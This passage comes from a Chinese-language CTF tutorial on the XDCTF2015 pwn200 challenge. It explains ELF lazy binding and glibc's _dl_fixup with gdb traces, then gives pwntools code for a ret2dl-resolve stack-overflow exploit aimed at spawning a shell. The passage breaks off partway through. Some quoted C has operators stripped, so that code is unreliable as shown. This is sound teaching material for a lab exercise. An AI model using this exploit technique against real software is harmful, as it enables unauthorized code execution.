Elf32_Word      st_size ;          /* Symbol size */ \n   unsigned   char   st_info ;          /* Symbol type and binding */ \n   unsigned   char   st_other ;         /* Symbol visibility */ \n   Elf32_Section   st_shndx ;         /* Section index */  }   Elf32_Sym ;  typedef   struct  { \n   Elf64_Word      st_name ;          /* Symbol name (string tbl index) */ \n   unsigned   char   st_info ;          /* Symbol type and binding */ \n   unsigned   char   st_other ;         /* Symbol visibility */ \n   Elf64_Section   st_shndx ;         /* Section index */ \n   Elf64_Addr      st_value ;         /* Symbol value */ \n   Elf64_Xword     st_size ;          /* Symbol size */  }   Elf64_Sym ;  \n\u4e0b\u9762\u7684\u5b8f\u63cf\u8ff0\u4e86 st_info \u662f\u600e\u6837\u88ab\u89e3\u6790\u548c\u63d2\u5165\u7684\uff1a /* How to extract and insert information held in the st_info field.  */  #define ELF32_ST_BIND(val)      (((unsigned char) (val))   4)  #define ELF32_ST_TYPE(val)      ((val)   0xf)  #define ELF32_ST_INFO(bind, type)   (((bind)   4) + ((type)   0xf))  /* Both Elf32_Sym and Elf64_Sym use the same one-byte st_info field.  */  #define ELF64_ST_BIND(val)      ELF32_ST_BIND (val)  #define ELF64_ST_TYPE(val)      ELF32_ST_TYPE (val)  #define ELF64_ST_INFO(bind, type)   ELF32_ST_INFO ((bind), (type))   \u6240\u4ee5 PLT[0] \u5176\u5b9e\u5c31\u662f\u8c03\u7528\u7684\u4ee5\u4e0b\u51fd\u6570\uff1a _dl_runtime_resolve(link_map_obj, reloc_index)  gdb-peda$ disassemble 0xf7fec370\nDump of assembler code for function _dl_runtime_resolve:\n   0xf7fec370  +0 :     push   eax\n   0xf7fec371  +1 :     push   ecx\n   0xf7fec372  +2 :     push   edx\n   0xf7fec373  +3 :     mov    edx,DWORD PTR [esp+0x10]\n   0xf7fec377  +7 :     mov    eax,DWORD PTR [esp+0xc]\n   0xf7fec37b  +11 :    call   0xf7fe6080  _dl_fixup \n   0xf7fec380  +16 :    pop    edx\n   0xf7fec381  +17 :    mov    ecx,DWORD PTR [esp]\n   0xf7fec384  +20 :    mov    DWORD PTR [esp],eax\n   0xf7fec387  +23 :    mov    eax,DWORD PTR [esp+0x4]\n   0xf7fec38b  +27 :    ret    0xc\nEnd of assembler dump. \n\u8be5\u51fd\u6570\u5728  glibc/sysdeps/i386/dl-trampoline.S  \u4e2d\u7528\u6c47\u7f16\u5b9e\u73b0\uff0c\u5148\u4fdd\u5b58\u5bc4\u5b58\u5668\uff0c\u7136\u540e\u5c06\u4e24\u4e2a\u503c\u5206\u522b\u4f20\u5165\u5bc4\u5b58\u5668\uff0c\u8c03\u7528  _dl_fixup \uff0c\u6700\u540e\u6062\u590d\u5bc4\u5b58\u5668\uff1a gdb-peda$ x/w $esp+0x10\n0xffffd598:     0x00000020\ngdb-peda$ x/w $esp+0xc\n0xffffd594:     0xf7ffd900 \n\u8fd8\u8bb0\u5f97\u8fd9\u4e24\u4e2a\u503c\u5417\uff0c\u4e00\u4e2a\u662f\u5728  write@plt+6 :     push   0x20  \u4e2d\u538b\u5165\u7684\u504f\u79fb\u91cf\uff0c\u4e00\u4e2a\u662f PLT[0] \u4e2d  push   DWORD PTR ds:0x804a004  \u538b\u5165\u7684 GOT[1]\u3002  \u51fd\u6570  _dl_fixup(struct link_map *l, ElfW(Word) reloc_arg) \uff0c\u5176\u53c2\u6570\u5206\u522b\u7531\u5bc4\u5b58\u5668  eax  \u548c  edx  \u63d0\u4f9b\u3002\u7ee7\u7eed\u8c03\u8bd5\uff1a gdb-peda$ n\n[----------------------------------registers-----------------------------------]\nEAX: 0xf7ffd900 --  0x0\nEBX: 0x804a000 --  0x8049f04 --  0x1\nECX: 0x2a8c\nEDX: 0x20 (   )\nESI: 0xf7f8ee28 --  0x1d1d30\nEDI: 0xffffd620 --  0x1\nEBP: 0xffffd638 --  0x0\nESP: 0xffffd588 --  0x3\nEIP: 0xf7fec37b ( _dl_runtime_resolve+11 :      call   0xf7fe6080  _dl_fixup )\nEFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0xf7fec372  _dl_runtime_resolve+2 :  push   edx\n   0xf7fec373  _dl_runtime_resolve+3 :  mov    edx,DWORD PTR [esp+0x10]\n   0xf7fec377  _dl_runtime_resolve+7 :  mov    eax,DWORD PTR [esp+0xc]\n=  0xf7fec37b  _dl_runtime_resolve+11 : call   0xf7fe6080  _dl_fixup \n   0xf7fec380  _dl_runtime_resolve+16 : pop    edx\n   0xf7fec381  _dl_runtime_resolve+17 : mov    ecx,DWORD PTR [esp]\n   0xf7fec384  _dl_runtime_resolve+20 : mov    DWORD PTR [esp],eax\n   0xf7fec387  _dl_runtime_resolve+23 : mov    eax,DWORD PTR [esp+0x4]\nGuessed arguments:\narg[0]: 0x3\narg[1]: 0x2a8c\narg[2]: 0xffffd5bc ( Welcome to XDCTF2015~!\\n )\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd588 --  0x3\n0004| 0xffffd58c --  0x2a8c\n0008| 0xffffd590 --  0xffffd5bc ( Welcome to XDCTF2015~!\\n )\n0012| 0xffffd594 --  0xf7ffd900 --  0x0\n0016| 0xffffd598 --  0x20 (   )\n0020| 0xffffd59c --  0x804861b (add    esp,0x10)\n0024| 0xffffd5a0 --  0x1\n0028| 0xffffd5a4 --  0xffffd5bc ( Welcome to XDCTF2015~!\\n )\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0xf7fec37b in _dl_runtime_resolve () from /lib/ld-linux.so.2\ngdb-peda$ s\n[----------------------------------registers-----------------------------------]\nEAX: 0xffffd5bc ( Welcome to XDCTF2015~!\\n )\nEBX: 0x804a000 --  0x8049f04 --  0x1\nECX: 0x2a8c\nEDX: 0x3\nESI: 0xf7f8ee28 --  0x1d1d30\nEDI: 0xffffd620 --  0x1\nEBP: 0xffffd638 --  0x0\nESP: 0xffffd59c --  0x804861b (add    esp,0x10)\nEIP: 0xf7ea3100 ( write :       push   esi)\nEFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0xf7ea30fb:  xchg   ax,ax\n   0xf7ea30fd:  xchg   ax,ax\n   0xf7ea30ff:  nop\n=  0xf7ea3100  write :  push   esi\n   0xf7ea3101  write+1 :        push   ebx\n   0xf7ea3102  write+2 :        sub    esp,0x14\n   0xf7ea3105  write+5 :        mov    ebx,DWORD PTR [esp+0x20]\n   0xf7ea3109  write+9 :        mov    ecx,DWORD PTR [esp+0x24]\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd59c --  0x804861b (add    esp,0x10)\n0004| 0xffffd5a0 --  0x1\n0008| 0xffffd5a4 --  0xffffd5bc ( Welcome to XDCTF2015~!\\n )\n0012| 0xffffd5a8 --  0x17\n0016| 0xffffd5ac --  0x80485a4 (add    ebx,0x1a5c)\n0020| 0xffffd5b0 --  0xffffd5ea --  0x0\n0024| 0xffffd5b4 --  0xf7ffca64 --  0x6\n0028| 0xffffd5b8 --  0xf7ffca68 --  0x3c ( )\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n0xf7ea3100 in write () from /usr/lib32/libc.so.6 \n\u5373\u4f7f\u6211\u4eec\u4f7f\u7528\u5355\u6b65\u8fdb\u5165\uff0c\u4e5f\u4e0d\u80fd\u8c03\u8bd5  _dl_fixup \uff0c\u5b83\u76f4\u63a5\u5c31\u6267\u884c\u5b8c\u6210\u5e76\u8df3\u8f6c\u5230 write \u51fd\u6570\u4e86\uff0c\u800c\u6b64\u65f6\uff0cGOT \u7684\u5730\u5740\u5df2\u7ecf\u88ab\u8986\u76d6\u4e3a\u5b9e\u9645\u5730\u5740\uff1a gdb-peda$ x/w 0x804a01c\n0x804a01c:      0xf7ea3100  \u518d\u5f3a\u8c03\u4e00\u904d\uff1afixup \u662f\u901a\u8fc7\u5bc4\u5b58\u5668\u53d6\u53c2\u6570\u7684\uff0c\u8fd9\u4f3c\u4e4e\u8fdd\u80cc\u4e86 32 \u4f4d\u7a0b\u5e8f\u7684\u8c03\u7528\u7ea6\u5b9a\uff0c\u4f46\u5b83\u5c31\u662f\u8fd9\u6837\uff0c\u4e0a\u9762 gdb \u4e2d\u663e\u793a\u7684\u53c2\u6570\u662f\u9519\u8bef\u7684\uff0c\u8be5\u51fd\u6570\u5bf9\u7a0b\u5e8f\u5458\u6765\u8bf4\u662f\u900f\u660e\u7684\uff0c\u6240\u4ee5\u4f1a\u5c3d\u91cf\u5c11\u7528\u6808\u53bb\u505a\u64cd\u4f5c\u3002  \u65e2\u7136\u4e0d\u80fd\u8c03\u8bd5\uff0c\u76f4\u63a5\u770b\u4ee3\u7801\u5427\uff0c\u5728  glibc/elf/dl-runtime.c  \u4e2d\uff1a DL_FIXUP_VALUE_TYPE  attribute_hidden   __attribute   (( noinline ))   ARCH_FIXUP_ATTRIBUTE  _dl_fixup   (  # ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS \n        ELF_MACHINE_RUNTIME_FIXUP_ARGS ,  # endif \n        struct   link_map   * l ,   ElfW ( Word )   reloc_arg )  { \n   // \u5206\u522b\u83b7\u53d6\u52a8\u6001\u94fe\u63a5\u7b26\u53f7\u8868\u548c\u52a8\u6001\u94fe\u63a5\u5b57\u7b26\u4e32\u8868\u7684\u57fa\u5740 \n   const   ElfW ( Sym )   * const   symtab \n     =   ( const   void   * )   D_PTR   ( l ,   l_info [ DT_SYMTAB ]); \n   const   char   * strtab   =   ( const   void   * )   D_PTR   ( l ,   l_info [ DT_STRTAB ]); \n\n   // \u901a\u8fc7\u53c2\u6570 reloc_arg \u8ba1\u7b97\u91cd\u5b9a\u4f4d\u5165\u53e3\uff0c\u8fd9\u91cc\u7684 DT_JMPREL \u5373 .rel.plt\uff0creloc_offset \u5373 reloc_arg \n   const   PLTREL   * const   reloc \n     =   ( const   void   * )   ( D_PTR   ( l ,   l_info [ DT_JMPREL ])   +   reloc_offset ); \n\n   // \u6839\u636e\u51fd\u6570\u91cd\u5b9a\u4f4d\u8868\u4e2d\u7684\u52a8\u6001\u94fe\u63a5\u7b26\u53f7\u8868\u7d22\u5f15\uff0c\u5373 reloc- r_info\uff0c\u83b7\u53d6\u51fd\u6570\u5728\u52a8\u6001\u94fe\u63a5\u7b26\u53f7\u8868\u4e2d\u5bf9\u5e94\u7684\u6761\u76ee \n   const   ElfW ( Sym )   * sym   =   symtab [ ELFW ( R_SYM )   ( reloc - r_info )]; \n   const   ElfW ( Sym )   * refsym   =   sym ; \n   void   * const   rel_addr   =   ( void   * )( l - l_addr   +   reloc - r_offset ); \n   lookup_t   result ; \n   DL_FIXUP_VALUE_TYPE   value ; \n\n   /* Sanity check that we re really looking at a PLT relocation.  */ \n   assert   ( ELFW ( R_TYPE )( reloc - r_info )   ==   ELF_MACHINE_JMP_SLOT ); \n\n    /* Look up the target symbol.  If the normal lookup rules are not        used don t look in the global scope.  */ \n   if   ( __builtin_expect   ( ELFW ( ST_VISIBILITY )   ( sym - st_other ),   0 )   ==   0 ) \n     { \n       const   struct   r_found_version   * version   =   NULL ; \n\n       if   ( l - l_info [ VERSYMIDX   ( DT_VERSYM )]   !=   NULL ) \n     { \n       const   ElfW ( Half )   * vernum   = \n         ( const   void   * )   D_PTR   ( l ,   l_info [ VERSYMIDX   ( DT_VERSYM )]); \n       ElfW ( Half )   ndx   =   vernum [ ELFW ( R_SYM )   ( reloc - r_info )]     0x7fff ; \n       version   =   l - l_versions [ ndx ]; \n       if   ( version - hash   ==   0 ) \n         version   =   NULL ; \n     } \n\n       /* We need to keep the scope around so do some locking.  This is       not necessary for objects which cannot be unloaded or when       we are not using any threads (yet).  */ \n       int   flags   =   DL_LOOKUP_ADD_DEPENDENCY ; \n       if   ( ! RTLD_SINGLE_THREAD_P ) \n     { \n       THREAD_GSCOPE_SET_FLAG   (); \n       flags   |=   DL_LOOKUP_GSCOPE_LOCK ; \n     }  #ifdef RTLD_ENABLE_FOREIGN_CALL \n       RTLD_ENABLE_FOREIGN_CALL ;  #endif \n       // \u6839\u636e strtab+sym- st_name \u5728\u5b57\u7b26\u4e32\u8868\u4e2d\u627e\u5230\u51fd\u6570\u540d\uff0c\u7136\u540e\u8fdb\u884c\u7b26\u53f7\u67e5\u627e\u83b7\u53d6 libc \u57fa\u5740 result \n       result   =   _dl_lookup_symbol_x   ( strtab   +   sym - st_name ,   l ,   sym ,   l - l_scope , \n                     version ,   ELF_RTYPE_CLASS_PLT ,   flags ,   NULL ); \n\n       /* We are done with the global scope.  */ \n       if   ( ! RTLD_SINGLE_THREAD_P ) \n     THREAD_GSCOPE_RESET_FLAG   ();  #ifdef RTLD_FINALIZE_FOREIGN_CALL \n       RTLD_FINALIZE_FOREIGN_CALL ;  #endif \n\n       /* Currently result contains the base load address (or link map)       of the object that defines sym.  Now add in the symbol     offset.  */ \n\n       // \u5c06\u8981\u89e3\u6790\u7684\u51fd\u6570\u7684\u504f\u79fb\u5730\u5740\u52a0\u4e0a libc \u57fa\u5740\uff0c\u5f97\u5230\u51fd\u6570\u7684\u5b9e\u9645\u5730\u5740 \n       value   =   DL_FIXUP_MAKE_VALUE   ( result , \n                    sym   ?   ( LOOKUP_VALUE_ADDRESS   ( result ) \n                       +   sym - st_value )   :   0 ); \n     } \n   else \n     { \n       /* We already found the symbol.  The module (and therefore its load       address) is also known.  */ \n       value   =   DL_FIXUP_MAKE_VALUE   ( l ,   l - l_addr   +   sym - st_value ); \n       result   =   l ; \n     } \n\n   /* And now perhaps the relocation addend.  */ \n   value   =   elf_machine_plt_value   ( l ,   reloc ,   value ); \n\n   // \u5c06\u5df2\u7ecf\u89e3\u6790\u5b8c\u6210\u7684\u51fd\u6570\u5730\u5740\u5199\u5165\u76f8\u5e94\u7684 GOT \u8868\u4e2d \n   if   ( sym   !=   NULL \n         __builtin_expect   ( ELFW ( ST_TYPE )   ( sym - st_info )   ==   STT_GNU_IFUNC ,   0 )) \n     value   =   elf_ifunc_invoke   ( DL_FIXUP_VALUE_ADDR   ( value )); \n\n   /* Finally, fix up the plt itself.  */ \n   if   ( __glibc_unlikely   ( GLRO ( dl_bind_not ))) \n     return   value ; \n\n   return   elf_machine_fixup_plt   ( l ,   result ,   refsym ,   sym ,   reloc ,   rel_addr ,   value );  }", 
            "title": "\u5ef6\u8fdf\u7ed1\u5b9a"
        }, 
        {
            "location": "/pwn/lab/6.1.3_pwn_xdctf2015_pwn200/#_3", 
            "text": "\u5173\u4e8e\u5ef6\u8fdf\u7ed1\u5b9a\u7684\u653b\u51fb\uff0c\u5728\u4e8e\u5f3a\u8feb\u52a8\u6001\u88c5\u8f7d\u5668\u89e3\u6790\u8bf7\u6c42\u7684\u51fd\u6570\u3002    \u56fea\u4e2d\uff0c\u56e0\u4e3a\u52a8\u6001\u8f6c\u8f7d\u5668\u662f\u4ece  .dynamic  \u6bb5\u7684  DT_STRTAB  \u6761\u76ee\u4e2d\u83b7\u5f97  .dynstr  \u6bb5\u7684\u5730\u5740\u7684\uff0c\u800c  DT_STRTAB  \u6761\u76ee\u7684\u4f4d\u7f6e\u5df2\u77e5\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e5f\u53ef\u5199\u3002\u6240\u4ee5\u653b\u51fb\u8005\u80fd\u591f\u6539\u5199  DT_STRTAB  \u6761\u76ee\u7684\u5185\u5bb9\uff0c\u6b3a\u9a97\u52a8\u6001\u88c5\u8f7d\u5668\uff0c\u8ba9\u5b83\u4ee5\u4e3a  .dynstr  \u6bb5\u5728  .bss  \u6bb5\u4e2d\uff0c\u5e76\u5728\u90a3\u91cc\u4f2a\u9020\u4e00\u4e2a\u5047\u7684\u5b57\u7b26\u4e32\u8868\u3002\u5f53\u5b83\u5c1d\u8bd5\u89e3\u6790 printf \u65f6\u4f1a\u4f7f\u7528\u4e0d\u540c\u7684\u57fa\u5730\u5740\u6765\u5bfb\u627e\u51fd\u6570\u540d\uff0c\u6700\u7ec8\u6267\u884c\u7684\u662f execve\u3002\u8fd9\u79cd\u65b9\u5f0f\u975e\u5e38\u7b80\u5355\uff0c\u4f46\u4ec5\u5f53\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u7684  .dynamic  \u6bb5\u53ef\u5199\u65f6\u6709\u6548\u3002  \u56feb\u4e2d\uff0c\u6211\u4eec\u5df2\u7ecf\u77e5\u9053  _dl_runtime_resolve  \u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f Elf_Rel \u6761\u76ee\u5728  .rel.plt  \u6bb5\u4e2d\u7684\u504f\u79fb\uff0c\u52a8\u6001\u88c5\u8f7d\u5668\u5c06\u8fd9\u4e2a\u503c\u52a0\u4e0a  .rel.plt  \u7684\u57fa\u5740\u6765\u5f97\u5230\u76ee\u6807\u7ed3\u6784\u4f53\u7684\u7edd\u5bf9\u4f4d\u7f6e\u3002\u7136\u540e\u5f53\u4f20\u9012\u7ed9  _dl_runtime_resolve  \u7684\u53c2\u6570  reloc_index  \u8d85\u51fa\u4e86  .rel.plt  \u6bb5\uff0c\u5e76\u6700\u7ec8\u843d\u5728  .bss  \u6bb5\u4e2d\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u8be5\u4f4d\u7f6e\u4f2a\u9020\u4e86\u4e00\u4e2a  Elf_Rel  \u7ed3\u6784\uff0c\u5e76\u586b\u5199  r_offset  \u7684\u503c\u4e3a\u4e00\u4e2a\u53ef\u5199\u7684\u5185\u5b58\u5730\u5740\u6765\u5c06\u89e3\u6790\u540e\u7684\u51fd\u6570\u5730\u5740\u5199\u5728\u90a3\u91cc\uff0c\u540c\u7406  r_info  \u4e5f\u4f1a\u662f\u4e00\u4e2a\u5c06\u52a8\u6001\u88c5\u8f7d\u5668\u5bfc\u5411\u5230\u653b\u51fb\u8005\u63a7\u5236\u5185\u5b58\u7684\u4e0b\u6807\u3002\u8fd9\u4e2a\u4e0b\u6807\u5c31\u6307\u5411\u4e00\u4e2a\u4f4d\u4e8e\u5b83\u540e\u9762\u7684  Elf_Sym  \u7ed3\u6784\uff0c\u800c  Elf_Sym  \u7ed3\u6784\u4e2d\u7684  st_name  \u540c\u6837\u8d85\u51fa\u4e86  .dynsym  \u6bb5\u3002\u8fd9\u6837\u8fd9\u4e2a\u7b26\u53f7\u5c31\u4f1a\u5305\u542b\u4e00\u4e2a\u76f8\u5bf9\u4e8e  .dynstr  \u5730\u5740\u8db3\u591f\u5927\u7684\u504f\u79fb\u4f7f\u5176\u80fd\u591f\u8fbe\u5230\u8fd9\u4e2a\u7b26\u53f7\u4e4b\u540e\u7684\u4e00\u6bb5\u5185\u5b58\uff0c\u800c\u90a3\u6bb5\u5185\u5b58\u91cc\u4fdd\u5b58\u7740\u8fd9\u4e2a\u5c06\u8981\u8c03\u7528\u7684\u51fd\u6570\u7684\u540d\u79f0\u3002   \u8fd8\u8bb0\u5f97\u6211\u4eec\u524d\u9762\u8bf4\u8fc7\u7684 GOT[1]\uff0c\u5b83\u662f\u4e00\u4e2a link_map \u7c7b\u578b\u7684\u6307\u9488\uff0c\u5176  l_info  \u57df\u4e2d\u6709\u4e00\u4e2a\u5305\u542b  .dynmic  \u6bb5\u4e2d\u6240\u6709\u6761\u76ee\u6784\u6210\u7684\u6570\u7ec4\u3002\u52a8\u6001\u94fe\u63a5\u5668\u5c31\u662f\u5229\u7528\u8fd9\u4e9b\u6307\u9488\u6765\u5b9a\u4f4d\u7b26\u53f7\u89e3\u6790\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u7684\u5bf9\u8c61\u7684\u3002\u901a\u8fc7\u8986\u76d6\u8fd9\u4e2a link_map \u7684\u4e00\u90e8\u5206\uff0c\u5c31\u80fd\u591f\u5c06  l_info  \u57df\u4e2d\u7684  DT_STRTAB  \u6761\u76ee\u6307\u5411\u4e00\u4e2a\u7279\u610f\u5236\u9020\u7684\u52a8\u6001\u6761\u76ee\uff0c\u90a3\u91cc\u5219\u6307\u5411\u4e00\u4e2a\u5047\u7684\u52a8\u6001\u5b57\u7b26\u4e32\u8868\u3002", 
            "title": "\u653b\u51fb"
        }, 
        {
            "location": "/pwn/lab/6.1.3_pwn_xdctf2015_pwn200/#pwn200", 
            "text": "\u83b7\u5f97\u4e86 re2dl-resolve \u6240\u9700\u7684\u6240\u6709\u77e5\u8bc6\uff0c\u4e0b\u9762\u6211\u4eec\u6765\u5206\u6790\u9898\u76ee\u3002  \u9996\u5148\u89e6\u53d1\u6808\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u504f\u79fb\u4e3a 112\uff1a gdb-peda$ pattern_offset 0x41384141\n1094205761 found at offset: 112  \u6839\u636e\u7406\u8bba\u77e5\u8bc6\u53ca\u5bf9\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u5206\u6790\uff0c\u6211\u4eec\u9700\u8981\u4e00\u4e2a read \u51fd\u6570\u7528\u4e8e\u8bfb\u5165\u540e\u7eed\u7684 payload \u548c\u4f2a\u9020\u7684\u5404\u79cd\u8868\uff0c\u4e00\u4e2a write \u51fd\u6570\u7528\u4e8e\u9a8c\u8bc1\u6bcf\u4e00\u6b65\u7684\u6b63\u786e\u6027\uff0c\u6700\u540e\u5c06 write \u6362\u6210 system\uff0c\u5c31\u80fd\u5f97\u5230 shell \u4e86\u3002 from   pwn   import   *  # context.log_level =  debug  elf   =   ELF ( ./a.out )  io   =   remote ( 127.0.0.1 ,   10001 )  io . recv ()  pppr_addr        =   0x08048699       # pop esi ; pop edi ; pop ebp ; ret  pop_ebp_addr     =   0x0804869b       # pop ebp ; ret  leave_ret_addr   =   0x080484b6       # leave ; ret  write_plt   =   elf . plt [ write ]  write_got   =   elf . got [ write ]  read_plt    =   elf . plt [ read ]  plt_0      =   elf . get_section_by_name ( .plt ) . header . sh_addr          # 0x80483e0  rel_plt    =   elf . get_section_by_name ( .rel.plt ) . header . sh_addr      # 0x8048390  dynsym     =   elf . get_section_by_name ( .dynsym ) . header . sh_addr       # 0x80481cc  dynstr     =   elf . get_section_by_name ( .dynstr ) . header . sh_addr       # 0x804828c  bss_addr   =   elf . get_section_by_name ( .bss ) . header . sh_addr          # 0x804a028  base_addr   =   bss_addr   +   0x600      # 0x804a628  \n\u5206\u522b\u83b7\u53d6\u4f2a\u9020\u5404\u79cd\u8868\u6240\u9700\u8981\u7684\u6bb5\u5730\u5740\uff0c\u5c06 bss \u6bb5\u7684\u5730\u5740\u52a0\u4e0a 0x600 \u4f5c\u4e3a\u4f2a\u9020\u6570\u636e\u7684\u57fa\u5730\u5740\uff0c\u8fd9\u91cc\u53ef\u80fd\u9700\u8981\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u7a0d\u52a0\u4fee\u6539\u3002gadget pppr \u7528\u4e8e\u5e73\u8861\u6808\uff0c pop ebp \u548c leave ret \u914d\u5408\uff0c\u4ee5\u8fbe\u5230\u5c06 esp \u6307\u5411 base_addr \u7684\u76ee\u7684\uff08\u5728\u7ae0\u82823.3.4\u4e2d\u6709\u8bb2\u5230\uff09\u3002  \u7b2c\u4e00\u90e8\u5206\u7684 payload \u5982\u4e0b\u6240\u793a\uff0c\u9996\u5148\u4ece\u6807\u51c6\u8f93\u5165\u8bfb\u53d6 100 \u5b57\u8282\u5230 base_addr\uff0c\u5c06 esp \u6307\u5411\u5b83\uff0c\u5e76\u8df3\u8f6c\u8fc7\u53bb\uff0c\u6267\u884c base_addr \u5904\u7684 payload\uff1a payload_1    =   A   *   112  payload_1   +=   p32 ( read_plt )  payload_1   +=   p32 ( pppr_addr )  payload_1   +=   p32 ( 0 )  payload_1   +=   p32 ( base_addr )  payload_1   +=   p32 ( 100 )  payload_1   +=   p32 ( pop_ebp_addr )  payload_1   +=   p32 ( base_addr )  payload_1   +=   p32 ( leave_ret_addr )  io . send ( payload_1 )   \u4ece\u8fd9\u91cc\u5f00\u59cb\uff0c\u540e\u9762\u7684 paylaod \u90fd\u662f\u901a\u8fc7 read \u51fd\u6570\u8bfb\u5165\u7684\uff0c\u6240\u4ee5\u5fc5\u987b\u4e3a 100 \u5b57\u8282\u957f\u3002\u9996\u5148\uff0c\u8c03\u7528 write@plt \u51fd\u6570\u6253\u5370\u51fa\u4e0e base_addr \u504f\u79fb 80 \u5b57\u8282\u5904\u7684\u5b57\u7b26\u4e32 \"/bin/sh\"\uff0c\u4ee5\u9a8c\u8bc1\u6808\u8f6c\u79fb\u6210\u529f\u3002\u6ce8\u610f\u7531\u4e8e  .dynstr  \u4e2d\u7684\u5b57\u7b26\u4e32\u90fd\u662f\u4ee5 \"\\x00\" \u7ed3\u5c3e\u7684\uff0c\u6240\u4ee5\u4f2a\u9020\u5b57\u7b26\u4e32\u4e3a \"bin/sh\\x00\"\u3002 payload_2    =   AAAA       # new ebp  payload_2   +=   p32 ( write_plt )  payload_2   +=   AAAA  payload_2   +=   p32 ( 1 )  payload_2   +=   p32 ( base_addr   +   80 )  payload_2   +=   p32 ( len ( /bin/sh ))  payload_2   +=   A   *   ( 80   -   len ( payload_2 ))  payload_2   +=   /bin/sh \\x00  payload_2   +=   A   *   ( 100   -   len ( payload_2 ))  io . sendline ( payload_2 )  print   io . recv ()   \u6211\u4eec\u77e5\u9053\u7b2c\u4e00\u6b21\u8c03\u7528 write@plt \u65f6\u5176\u5b9e\u662f\u5148\u5c06 reloc_index \u538b\u5165\u6808\uff0c\u7136\u540e\u8df3\u8f6c\u5230 PLT[0]\uff1a gdb-peda$ disassemble write\nDump of assembler code for function write@plt:\n   0x08048430  +0 :     jmp    DWORD PTR ds:0x804a01c\n   0x08048436  +6 :     push   0x20\n   0x0804843b  +11 :    jmp    0x80483e0\nEnd of assembler dump. \n\u8fd9\u6b21\u6211\u4eec\u8df3\u8fc7\u8fd9\u4e2a\u8fc7\u7a0b\uff0c\u76f4\u63a5\u63a7\u5236  eip  \u8df3\u8f6c\u5230 PLT[0]\uff0c\u5e76\u5728\u6808\u4e0a\u5e03\u7f6e\u4e0a reloc_index\uff0c\u5373  0x20 \uff0c\u5c31\u50cf\u662f\u8c03\u7528\u4e86 write@plt \u4e00\u6837\u3002 reloc_index   =   0x20  payload_3    =   AAAA  payload_3   +=   p32 ( plt_0 )  payload_3   +=   p32 ( reloc_index )  payload_3   +=   AAAA  payload_3   +=   p32 ( 1 )  payload_3   +=   p32 ( base_addr   +   80 )  payload_3   +=   p32 ( len ( /bin/sh ))  payload_3   +=   A   *   ( 80   -   len ( payload_3 ))  payload_3   +=   /bin/sh \\x00  payload_3   +=   A   *   ( 100   -   len ( payload_3 ))  io . sendline ( payload_3 )  print   io . recv ()   \u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u66f4\u8fdb\u4e00\u6b65\uff0c\u4f2a\u9020\u4e00\u4e2a write \u51fd\u6570\u7684 Elf32_Rel \u7ed3\u6784\u4f53\uff0c\u539f\u7ed3\u6784\u4f53\u5728  .rel.plt  \u4e2d\uff0c\u5982\u4e0b\u6240\u793a\uff1a typedef   struct  { \n   Elf32_Addr      r_offset ;         /* Address */ \n   Elf32_Word      r_info ;           /* Relocation type and symbol index */  }   Elf32_Rel ;   $ readelf -r a.out | grep write\n0804a01c  00000707 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0 \n\u8be5\u7ed3\u6784\u4f53\u7684  r_offset  \u662f write@got \u5730\u5740\uff0c\u5373  0x0804a01c \uff0c r_info  \u662f  0x707 \u3002\u52a8\u6001\u88c5\u8f7d\u5668\u901a\u8fc7 reloc_index \u627e\u5230\u5b83\uff0c\u800c reloc_index \u662f\u76f8\u5bf9\u4e8e  .rel.plt  \u7684\u504f\u79fb\uff0c\u6240\u4ee5\u6211\u4eec\u5982\u679c\u63a7\u5236\u4e86\u8fd9\u4e2a\u504f\u79fb\uff0c\u5c31\u53ef\u4ee5\u8df3\u8f6c\u5230\u4f2a\u9020\u7684 write \u4e0a\u3002payload \u5982\u4e0b\uff1a reloc_index   =   base_addr   +   28   -   rel_plt    # fake_reloc = base_addr + 28  r_info   =   0x707  fake_reloc   =   p32 ( write_got )   +   p32 ( r_info )  payload_4    =   AAAA  payload_4   +=   p32 ( plt_0 )  payload_4   +=   p32 ( reloc_index )  payload_4   +=   AAAA  payload_4   +=   p32 ( 1 )  payload_4   +=   p32 ( base_addr   +   80 )  payload_4   +=   p32 ( len ( /bin/sh ))  payload_4   +=   fake_reloc  payload_4   +=   A   *   ( 80   -   len ( payload_4 ))  payload_4   +=   /bin/sh \\x00  payload_4   +=   A   *   ( 100   -   len ( payload_4 ))  io . sendline ( payload_4 )  print   io . recv ()  \n\u53e6\u5916\u8bb2\u4e00\u8bb2 Elf32_Rel \u503c\u7684\u8ba1\u7b97\u65b9\u6cd5\u5982\u4e0b\uff0c\u6211\u4eec\u4e0b\u9762\u4f1a\u5f97\u7528\u5230\uff1a #define ELF32_R_SYM(val)        ((val)   8)  #define ELF32_R_TYPE(val)       ((val)   0xff)  #define ELF32_R_INFO(sym, type)     (((sym)   8) + ((type)   0xff))  \n-  ELF32_R_SYM(0x707) = (0x707   8) = 0x7 \uff0c\u5373  .dynsym  \u7684\u7b2c 7 \u884c\n-  ELF32_R_TYPE(0x707) = (0x707   0xff) = 0x7 \uff0c\u5373  #define R_386_JMP_SLOT 7 /* Create PLT entry */ \n-  ELF32_R_INFO(0x7, 0x7) = (((0x7   8) + ((0x7)   0xff)) = 0x707 \uff0c\u5373 r_info  \u8fd9\u4e00\u6b21\uff0c\u4f2a\u9020\u4f4d\u4e8e  .dynsym  \u6bb5\u7684\u7ed3\u6784\u4f53 Elf32_Sym\uff0c\u539f\u7ed3\u6784\u4f53\u5982\u4e0b\uff1a typedef   struct  { \n   Elf32_Word      st_name ;          /* Symbol name (string tbl index) */ \n   Elf32_Addr 